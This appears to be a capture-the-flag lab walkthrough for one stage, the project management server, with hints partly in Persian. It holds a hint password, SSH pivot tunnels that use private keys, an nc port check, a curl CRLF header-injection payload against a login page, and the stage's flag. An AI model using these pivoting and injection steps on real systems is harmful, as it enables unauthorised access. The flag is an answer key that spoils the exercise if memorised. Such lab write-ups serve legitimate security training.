# Project Management

1. **Resume From [PC2](<../5_PC2/>)**

2. **Hint:**

    ```text
    ۱. 
    faraji:P@ssw0rd!
    ۲. 
    دسترسی ادمین را بدست آورید 
    ```

3. **Ping project management server from PC2:**

    ```shell
    ssh -N -i ./id_ed25519 -p 2200 -L 0.0.0.0:7777:10.233.27.37:22 vpn_user@172.16.3.64
    ```

    In a new terminal:

    ```shell
    ssh -p 7777 -i 05-rsa.rezaee.priv rezaee@127.0.0.1
    ping pm
    ```

    Project management server IP: `10.233.58.241`

4. **Check which ports are open on the project management server:**

    1. **Check if port 22 and 2200 are open on project management server for ssh:**

        ```shell
        ssh faraji@10.233.58.241
        ssh -p 2200 faraji@10.233.58.241
        ```

    2. **Check if port 80 is open on project management server for http:**

        ```shell
        nc -zv 10.233.58.241 80
        ```

        Output:

        ```shell
        Connection to  port 80 10.233.58.241 succeeded!
        ```

5. **Create an SSH tunnel to access port 80 on the project management server:**

    ```shell
    ssh -i ./id_ed25519 -p 2200 -L 18080:10.233.58.241:80 vpn_user@172.16.3.64
    ```

6. **Access the project management server through the tunnel:**

    ```shell
    http://localhost:18080
    ```

7. CLRF Injection

 ```shell
 curl -X POST -d "username=admin%0d%0aContent-Length:0%0d%0a" http://localhost:18080/login
 ```

8. **Flag:**

 ```shell
 flag{CLRF_injection_is_very_interesting}
 ```
